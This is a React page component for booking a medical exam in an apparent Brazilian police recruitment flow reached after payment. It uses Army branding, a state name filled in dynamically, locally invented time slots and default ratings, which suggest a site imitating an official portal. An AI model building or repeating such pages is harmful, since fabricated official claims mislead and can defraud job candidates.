import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Shield, CheckCircle } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { MedicalSchedulingLoader } from '@/components/MedicalSchedulingLoader';
import { normalizeGender } from '@/utils/gender';
import { useEstadoPM } from '@/hooks/useEstadoPM';

interface MedicalCenter {
  id: string;
  name: string;
  address: string;
  distance: number;
  type: 'ubs' | 'upa' | 'hospital' | 'clinica_credenciada';
  phone: string;
  rating?: number;
  availableSlots: string[];
  nextAvailableDate: string;
}

export default function AgendamentoMedicoPage() {
  const [, setLocation] = useLocation();
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const [candidateName, setCandidateName] = useState('');
  const [cityName, setCityName] = useState('');
  const [candidateGender, setCandidateGender] = useState('');
  const [selectedCenter, setSelectedCenter] = useState<MedicalCenter | null>(null);
  const [selectedDate, setSelectedDate] = useState('');
  const [selectedTime, setSelectedTime] = useState('');
  const [medicalCenters, setMedicalCenters] = useState<MedicalCenter[]>([]);
  const [loading, setLoading] = useState(true);
  const [showLoader, setShowLoader] = useState(true);
  const [showTimeSlots, setShowTimeSlots] = useState(false);
  const [currentMonth, setCurrentMonth] = useState(new Date());
  const [availableDates, setAvailableDates] = useState<string[]>([]);
  const { trackEvent } = useClarityEvents();

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Check if user passed through login validation
    const loginValidated = localStorage.getItem('loginValidated');
    if (!loginValidated) {
      setLocation('/login-pos-pagamento');
      return;
    }
    
    trackEvent('medical_appointment_page_accessed', {
      page: 'agendamento_medico',
      timestamp: new Date().toISOString()
    });
  }, []);

  // Handle loader completion and data loading
  useEffect(() => {
    if (!showLoader) {
      loadUserData();
      loadMedicalCenters();
      generateAvailableDates();
    }
  }, [showLoader]);

  // Generate available dates: next 21 calendar days, Mon–Sat (skip Sun)
  const generateAvailableDates = () => {
    const dates = [];
    const today = new Date();
    for (let i = 1; i <= 21; i++) {
      const d = new Date(today);
      d.setDate(today.getDate() + i);
      if (d.getDay() !== 0) { // skip Sundays only
        dates.push(d.toISOString().split('T')[0]);
      }
    }
    setAvailableDates(dates);
  };


  // Generate time slots: Saturday = morning only (8h–12h); weekdays = morning + evening
  const generateTimeSlots = (date: string): string[] => {
    const slots = [];
    const isSaturday = date ? new Date(date + 'T12:00:00').getDay() === 6 : false;
    // Morning: 8:00–11:00 on weekdays, 8:00–12:00 on Saturdays
    for (let hour = 8; hour < 12; hour++) {
      slots.push(`${hour.toString().padStart(2, '0')}:00`);
      if (hour < 11 || isSaturday) {
        slots.push(`${hour.toString().padStart(2, '0')}:30`);
      }
    }
    if (isSaturday) {
      slots.push('12:00');
    } else {
      // Evening: 19:00–22:00 on weekdays only
      for (let hour = 19; hour < 23; hour++) {
        slots.push(`${hour.toString().padStart(2, '0')}:00`);
        if (hour < 22) {
          slots.push(`${hour.toString().padStart(2, '0')}:30`);
        }
      }
    }
    return slots;
  };

  // Group date strings by calendar week (Monday-anchored)
  const groupDatesByWeek = (dates: string[]): { weekLabel: string; dates: string[] }[] => {
    const months = ['jan','fev','mar','abr','mai','jun','jul','ago','set','out','nov','dez'];
    const groups: { weekKey: string; weekLabel: string; dates: string[] }[] = [];
    for (const dateStr of dates) {
      const d = new Date(dateStr + 'T12:00:00');
      const dow = d.getDay(); // 0=Sun … 6=Sat
      const diffToMonday = dow === 0 ? -6 : 1 - dow;
      const monday = new Date(d);
      monday.setDate(d.getDate() + diffToMonday);
      const weekKey = monday.toISOString().split('T')[0];
      let group = groups.find(g => g.weekKey === weekKey);
      if (!group) {
        const friday = new Date(monday);
        friday.setDate(monday.getDate() + 4);
        const sameMonth = monday.getMonth() === friday.getMonth();
        const weekLabel = sameMonth
          ? `Semana de ${monday.getDate()} a ${friday.getDate()} de ${months[friday.getMonth()]}`
          : `Semana de ${monday.getDate()} de ${months[monday.getMonth()]} a ${friday.getDate()} de ${months[friday.getMonth()]}`;
        group = { weekKey, weekLabel, dates: [] };
        groups.push(group);
      }
      group.dates.push(dateStr);
    }
    return groups;
  };

  const formatDateDisplay = (dateString: string): string => {
    const date = new Date(dateString);
    const days = ['Domingo', 'Segunda', 'Terça', 'Quarta', 'Quinta', 'Sexta', 'Sábado'];
    const months = ['Jan', 'Fev', 'Mar', 'Abr', 'Mai', 'Jun', 'Jul', 'Ago', 'Set', 'Out', 'Nov', 'Dez'];
    
    return `${days[date.getDay()]}, ${date.getDate()} ${months[date.getMonth()]}`;
  };

  const loadUserData = () => {
    const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
    
    if (userData) {
      try {
        const parsedData = JSON.parse(userData);
        
        // Get name consistently — supports both old and new flows
        const fullName = parsedData.name || parsedData.nomeCompleto || parsedData.autoFilledData?.nome || '';
        if (fullName) {
          const firstName = fullName.split(' ')[0];
          setCandidateName(firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase());
        }
        
        // Get city — tries: juntaData, userData fields, examLocation, pessoalData
        let city = '';
        try {
          const examLocation = parsedData.examLocation || JSON.parse(localStorage.getItem('examLocation') || '{}');
          let pessoalCidade = '';
          try {
            const pessoal = JSON.parse(localStorage.getItem('pessoalData') || '{}');
            pessoalCidade = pessoal?.cidade || pessoal?.autoFilledData?.cidade || '';
          } catch { /* ignore */ }
          city = parsedData.additionalData?.juntaData?.municipio ||
                 parsedData.cidade ||
                 parsedData.autoFilledData?.cidade ||
                 examLocation?.name ||
                 pessoalCidade ||
                 '';
        } catch { /* ignore */ }
        setCityName(city || 'sua cidade');
        
        // Get gender consistently
        const rawGender = parsedData.gender || parsedData.genero || parsedData.sexo || parsedData.autoFilledData?.sexo || '';
        const gender = normalizeGender(rawGender);
        setCandidateGender(gender);
        
        console.log('User data loaded:', { name: fullName, city, gender });
      } catch (error) {
        console.error('Error loading user data:', error);
        setLocation('/login-pos-pagamento');
      }
    } else {
      setLocation('/login-pos-pagamento');
    }
  };

  const loadMedicalCenters = async () => {
    try {
      setLoading(true);
      
      let cep = null;

      // 1. Try old flow: juntaData.cep_consultado inside userMedicalLogin.additionalData
      try {
        const parsedLogin = JSON.parse(localStorage.getItem('userMedicalLogin') || '{}');
        cep = parsedLogin?.additionalData?.juntaData?.cep_consultado || null;
        if (cep) console.log('Using CEP from juntaData (old flow):', cep);
      } catch { /* ignore */ }

      // 2. Try userData direct fields
      if (!cep) {
        try {
          const parsedUserData = JSON.parse(localStorage.getItem('userData') || '{}');
          cep = parsedUserData?.autoFilledData?.cep ||
                parsedUserData?.cep ||
                parsedUserData?.additionalData?.pessoalData?.cep ||
                parsedUserData?.additionalData?.pessoalData?.autoFilledData?.cep ||
                parsedUserData?.additionalData?.inscricaoData?.vaga?.meta?.cep ||
                parsedUserData?.additionalData?.inscricaoData?.vaga?.meta?.autoFilledData?.cep ||
                null;
          if (cep) console.log('Using CEP from userData:', cep);
        } catch { /* ignore */ }
      }

      // 3. Try pessoalData key in localStorage (restored on login from inscricaoData.vaga.meta)
      if (!cep) {
        try {
          const pessoalData = JSON.parse(localStorage.getItem('pessoalData') || '{}');
          cep = pessoalData?.cep || pessoalData?.autoFilledData?.cep || null;
          if (cep) console.log('Using CEP from pessoalData:', cep);
        } catch { /* ignore */ }
      }
      console.log('CEP for medical centers search:', cep)
      if (cep) {
        console.log('Fetching medical centers for CEP:', cep);
        const response = await fetch(`/api/locais-exame/${cep}`);
        
        const result = await response.json();
        console.log('Medical centers API response:', result);
        
        if (result.success && result.data) {
          // Transform the exam locations data to medical centers format
          const centers: MedicalCenter[] = result.data.locais.map((location: any, index: number) => ({
            id: `center_${index}`,
            name: location.name,
            address: location.address,
            distance: location.distance || 0,
            type: location.type === 'hospital' ? 'hospital' : 
                  location.type === 'upa' ? 'upa' : 
                  location.type === 'ubs' ? 'ubs' : 'clinica_credenciada',
            phone: location.phone || 'Telefone não informado',
            rating: location.rating || 4.5,
            availableSlots: generateTimeSlots(availableDates[0] || ''),
            nextAvailableDate: availableDates[0] || ''
          }));
          
          setMedicalCenters(centers);
          console.log('Medical centers loaded:', centers.length);
        } else {
          console.log('No medical centers found or API error');
          setMedicalCenters([]);
        }
      } else {
        console.log('No CEP found for medical centers search');
        setMedicalCenters([]);
      }
    } catch (error) {
      console.error('Error loading medical centers:', error);
      setMedicalCenters([]);
    } finally {
      setLoading(false);
    }
  };

  const handleCenterSelect = (center: MedicalCenter) => {
    setSelectedCenter(center);
    setShowTimeSlots(true);
    setSelectedDate('');
    setSelectedTime('');
    
    trackEvent('medical_center_selected', {
      center_name: center.name,
      center_type: center.type,
      distance: center.distance,
      page: 'agendamento_medico',
      timestamp: new Date().toISOString()
    });
  };

  const handleTimeSlotSelect = (date: string, time: string) => {
    setSelectedDate(date);
    setSelectedTime(time);
    
    trackEvent('medical_time_slot_selected', {
      selected_date: date,
      selected_time: time,
      center_name: selectedCenter?.name,
      page: 'agendamento_medico',
      timestamp: new Date().toISOString()
    });
  };

  const handleConfirmAppointment = () => {
    if (!selectedCenter || !selectedDate || !selectedTime) {
      alert('Por favor, selecione um centro médico, data e horário.');
      return;
    }

    // Store appointment data
    const appointmentData = {
      center: selectedCenter,
      date: selectedDate,
      time: selectedTime,
      candidateName,
      cityName,
      scheduledAt: new Date().toISOString()
    };
    
    localStorage.setItem('medicalAppointment', JSON.stringify(appointmentData));
    
    trackEvent('medical_appointment_confirmed', {
      center_name: selectedCenter.name,
      selected_date: selectedDate,
      selected_time: selectedTime,
      candidate_name: candidateName,
      page: 'agendamento_medico',
      timestamp: new Date().toISOString()
    });
    
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setLocation('/confirmacao-medica');
  };

  const getCenterTypeLabel = (type: string) => {
    const labels = {
      'ubs': 'UBS',
      'upa': 'UPA',
      'hospital': 'Hospital',
      'clinica_credenciada': 'Clínica Credenciada'
    };
    return labels[type as keyof typeof labels] || type;
  };

  if (showLoader) {
    return <MedicalSchedulingLoader onComplete={() => setShowLoader(false)} />;
  }

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader customTitle={sigla} />
      
      <main className="max-w-4xl mx-auto px-6 py-8 pt-0">
        <nav className="text-xs text-gray-500 mb-6" aria-label="Breadcrumb">
          <span className="hover:text-gray-700 cursor-pointer">Home</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="hover:text-gray-700 cursor-pointer">Exame Médico</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-900 font-medium">Agendamento</span>
        </nav>

        {/* Header */}
        <header className="mb-8">
          <h1 className="text-xl font-semibold text-gray-900 mb-2 leading-tight">
            {candidateGender === 'feminino' 
              ? "Agendamento do Exame Médico"
              : "Agendamento de Exame Médico"
            }
          </h1>
          <p className="text-sm text-gray-500 leading-relaxed mb-0">
            {candidateName
              ? `${candidateName}, selecione data e local para sua perícia médica admissional — Concurso ${sigla} 2026.`
              : `Selecione data e local para sua perícia médica admissional — Concurso ${sigla} 2026.`
            }
            {candidateGender === 'feminino' && <> Processo com total privacidade e respeito às especificidades femininas.</>}
          </p>
        </header>

        {/* Medical Center Information */}
        <article className="mb-8">
          <h2 className="text-base font-semibold text-gray-700 mb-4">Informações sobre a Perícia Médica Admissional</h2>
          <div className="grid md:grid-cols-2 gap-6 text-sm text-gray-700">
            <div>
              <h3 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-2">Procedimentos realizados</h3>
              <ul className="space-y-1">
                <li>• Anamnese e sinais vitais</li>
                <li>• Avaliação visual e auditiva</li>
                <li>• Avaliação de capacidade laborativa</li>
                <li>• Exame clínico geral</li>
              </ul>
            </div>
            <div>
              <h3 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-2">Documentação obrigatória</h3>
              <ul className="space-y-1">
                <li>• RG e CPF (originais)</li>
                <li>• Comprovante de endereço</li>
                <li>• Protocolo oficial emitido</li>
                <li>• Laudo médico anterior (se houver)</li>
              </ul>
            </div>
          </div>
        </article>

        {/* Female Security Notice */}
        {candidateGender === 'feminino' && !showTimeSlots && (
          <article className="mb-6">
            <div className="flex items-start space-x-2 p-3 bg-white border border-gray-200 rounded-lg">
              <Shield className="w-4 h-4 text-gray-500 flex-shrink-0 mt-0.5" />
              <p className="text-sm text-gray-600">
                <strong className="text-gray-800">Atendimento por profissionais femininas:</strong> Toda perícia será realizada por médicas e enfermeiras, conforme protocolo da {sigla}.
              </p>
            </div>
          </article>
        )}

        {/* Medical Centers */}
        {!showTimeSlots ? (
          <article className="mb-8">
            <h2 className="text-base font-semibold text-gray-700 mb-4">
              Centros Médicos Credenciados — {cityName}
            </h2>
            <div>
              
              {loading ? (
                <div className="text-center py-8">
                  <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-gray-400 mx-auto"></div>
                  <p className="text-gray-600 mt-2 text-sm">Localizando centros credenciados...</p>
                </div>
              ) : medicalCenters.length > 0 ? (
                <div className="space-y-3">
                  {medicalCenters.map((center) => (
                    <div
                      key={center.id}
                      className="border border-gray-200 rounded-lg p-4 hover:border-green-400 hover:border-l-4 cursor-pointer transition-all"
                      onClick={() => handleCenterSelect(center)}
                    >
                      <div className="flex justify-between items-start">
                        <div className="flex-1">
                          <h3 className="text-sm font-semibold text-gray-900 mb-1">{center.name}</h3>
                          <p className="text-xs text-gray-500 mb-2">{center.address}</p>
                          <span className="text-xs text-gray-400">{center.distance.toFixed(1)} km</span>
                        </div>
                        <button
                          className="ml-4 px-3 py-1.5 text-xs font-medium border border-gray-200 rounded-lg hover:border-green-500 hover:text-green-700 transition-colors"
                          onClick={() => handleCenterSelect(center)}
                        >
                          Selecionar
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-8">
                  <p className="text-gray-600 text-sm">
                    Centros médicos não localizados. Contate o suporte se necessário.
                  </p>
                </div>
              )}
            </div>
          </article>
        ) : (
          /* Time Slots Selection */
          <div className="space-y-6">
            <article>
              <div className="mb-6">
                <div className="flex items-center justify-between mb-4">
                  <h2 className="text-base font-semibold text-gray-700">Centro Selecionado</h2>
                  <button 
                    onClick={() => setShowTimeSlots(false)}
                    className="px-3 py-1 text-sm border border-gray-300 rounded hover:bg-gray-50"
                  >
                    Alterar
                  </button>
                </div>
                <div className="flex items-start space-x-2 p-3 bg-white border border-gray-200 rounded-lg">
                  <CheckCircle className="w-4 h-4 text-green-600 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm font-semibold text-gray-900">{selectedCenter?.name}</p>
                    <p className="text-xs text-gray-500">{selectedCenter?.address}</p>
                  </div>
                </div>
              </div>
            </article>

            <article>
              <h2 className="text-base font-semibold text-gray-700 mb-4">Data e Horário</h2>
              <div>
                
                <div className="grid lg:grid-cols-2 gap-6">
                  <div>
                    <h3 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-3">Datas disponíveis</h3>
                    <div className="space-y-4">
                      {groupDatesByWeek(availableDates).map(({ weekLabel, dates: weekDates }) => (
                        <div key={weekLabel}>
                          <p className="text-xs text-gray-400 uppercase tracking-wide mb-1.5">{weekLabel}</p>
                          <div className="space-y-1.5">
                            {weekDates.map((date) => {
                              const isSat = new Date(date + 'T12:00:00').getDay() === 6;
                              return (
                                <button
                                  key={date}
                                  onClick={() => { setSelectedDate(date); setSelectedTime(''); }}
                                  className={`w-full text-left p-2 rounded-lg border text-sm transition-colors ${
                                    selectedDate === date
                                      ? 'border-green-600 bg-green-50 text-green-900 font-medium'
                                      : 'border-gray-200 hover:border-gray-300 text-gray-700'
                                  }`}
                                >
                                  <span className="capitalize">{formatDateDisplay(date)}</span>
                                  {isSat && (
                                    <span className="ml-2 text-xs text-gray-400">(manhã)</span>
                                  )}
                                </button>
                              );
                            })}
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div>
                    <h3 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-3">Horários disponíveis</h3>
                    {selectedDate ? (() => {
                      const isSat = new Date(selectedDate + 'T12:00:00').getDay() === 6;
                      const allSlots = generateTimeSlots(selectedDate);
                      const morning = allSlots.filter(t => parseInt(t) < 13);
                      const evening = allSlots.filter(t => parseInt(t) >= 13);
                      const SlotBtn = ({ time }: { time: string }) => (
                        <button
                          key={time}
                          onClick={() => setSelectedTime(time)}
                          className={`p-2 text-sm rounded-lg border transition-colors ${
                            selectedTime === time
                              ? 'border-green-600 bg-green-50 text-green-900 font-medium'
                              : 'border-gray-200 hover:border-gray-300 text-gray-700'
                          }`}
                        >
                          {time}
                        </button>
                      );
                      return (
                        <div className="space-y-3">
                          <div>
                            <p className="text-xs text-gray-400 mb-1.5">
                              Manhã{isSat ? ' · sábado' : ''}
                            </p>
                            <div className="grid grid-cols-3 gap-2">
                              {morning.map(t => <SlotBtn key={t} time={t} />)}
                            </div>
                          </div>
                          {!isSat && evening.length > 0 && (
                            <div>
                              <p className="text-xs text-gray-400 mb-1.5">Noite</p>
                              <div className="grid grid-cols-3 gap-2">
                                {evening.map(t => <SlotBtn key={t} time={t} />)}
                              </div>
                            </div>
                          )}
                        </div>
                      );
                    })() : (
                      <p className="text-gray-500 text-sm">Selecione uma data</p>
                    )}
                  </div>
                </div>

                {selectedDate && selectedTime && (
                  <div className="mt-6 p-4 border border-gray-200 rounded-lg bg-white">
                    <p className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-3">Resumo do agendamento</p>
                    <div className="space-y-1 text-sm text-gray-700">
                      <p><span className="text-gray-400">Data:</span> <strong className="text-gray-900">{new Date(selectedDate).toLocaleDateString('pt-BR', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' })}</strong></p>
                      <p><span className="text-gray-400">Horário:</span> <strong className="text-gray-900">{selectedTime}</strong></p>
                      <p><span className="text-gray-400">Local:</span> <strong className="text-gray-900">{selectedCenter?.name}</strong></p>
                    </div>
                  </div>
                )}
              </div>
            </article>
          </div>
        )}

        {/* Confirm Button */}
        {selectedCenter && selectedDate && selectedTime && (
          <div className="mt-8">
            <button
              onClick={handleConfirmAppointment}
              className="w-full max-w-sm mx-auto flex items-center justify-center gap-2 py-3 text-sm font-semibold text-white rounded-lg transition-colors duration-200"
              style={{ backgroundColor: '#0063AF' }}
              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#004D8C'}
              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#0063AF'}
            >
              Confirmar Agendamento
            </button>
          </div>
        )}
      </main>

      <ExercitoFooter />
    </div>
  );
}